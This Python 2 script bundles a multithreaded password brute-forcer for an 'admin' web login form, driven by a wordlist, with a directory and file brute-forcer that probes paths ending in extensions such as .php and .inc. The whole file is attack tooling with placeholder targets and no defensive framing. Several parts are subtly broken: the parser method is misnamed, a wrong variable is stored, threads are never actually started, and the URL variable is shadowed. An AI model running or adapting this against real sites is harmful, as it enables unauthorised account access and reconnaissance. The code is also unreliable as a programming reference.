import threading
from Queue import Queue as Qu
import urllib
import  urllib2
import cookielib
import sys
from HTMLParser import HTMLParser

username = "admin"
target_url = "https://xxxxxxx/admin"
target_post = "https://wwwwwwwwwww/admin"
username_placeholder = "username"
password_placeholder = "password"
success_check = "Administration - Control_panel"
Num_of_threads = 100
url = "https://xxxxx"
wordlist_file ="./wordlist.txt"
resume =None
user_agent = "Mozilla/5.0"


class login_brute(object):
    def __init__(self, username, words):
        self.username = username
        self.passwd = words
        self.found = 0
    def run_bruter(self):
        for i in range(Num_of_threads):
            th = threading.Thread(target=self.web_brute)
            th.start()

    def web_brute(self):
        while not self.passwd.empty() and not self.found:
            brt = self.passwd.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))

            replies = opener.open(target_url)
            page = replies.read()

            print "Currently working on: %s : %s (%d left)" %(self.username,brt,self.passwd.qsize())

            parser = BruteParser()
            parser.feed(page)

            post = parser.tag_results
            post[username_placeholder]=self.username
            post[password_placeholder]=brt

            login=urllib.urlencode(post)
            login_reply = opener.open(target_post,login)
            result = login_reply.read()
            if success_check in result:
                self.found=1
                print "login success, under %s, %s" %(self.username,brt)


class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}
    def handle_tag(self,tag,attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name=value
                if name =="value":
                    tag_value=value
            if tag_name is not None:
                self.tag_results[tag_name]=value
def build_(wordlist_file):
    with open(wordlist_file, "rb") as fp:
        tmp = fp.readlines()

    found_resuem = 0
    words = Qu()

    for word in tmp:
        word = word.rstrip()
        if resume is not None:
            if found_resuem:
                words.put(word)
            else:
                if word == resume:
                    found_resuem = 1
                    print "Resuming wordlist from: %s" %resume
        else:
            words.put(word)
    return words


def bruter(words,ext=None):

    while not words.empty():
        trial = words.get()
        list_of_trial = []

        if '.' not in trial:
            list_of_trial.append("/%s/"%trial)
        else:
            list_of_trial.append("/%s" %trial)

        if ext:
            for ex in ext:
                list_of_trial.append("/%s%s" %(trial,ex))

        for bru in list_of_trial:
            url = "%s%s"%(url,urllib.quote(bru))

            try:
                http_header = {}
                http_header["User-Agent"] = user_agent
                r = urllib2.Request(url,headers=http_header)
                replies = urllib2.urlopen(r)
                if len(replies.read()):
                    print "[%d] =>>> %s" % (replies.code,url)
            except:
                print "error occured"

                pass

if __name__ == '__main__':
    words = build_(wordlist_file)
    exten = [".bal", ".txt", ".php", ".inc", ".html"]

    for iter in range(Num_of_threads):
        th = threading.Thread(target=bruter, args=(words,exten,))
        th.start
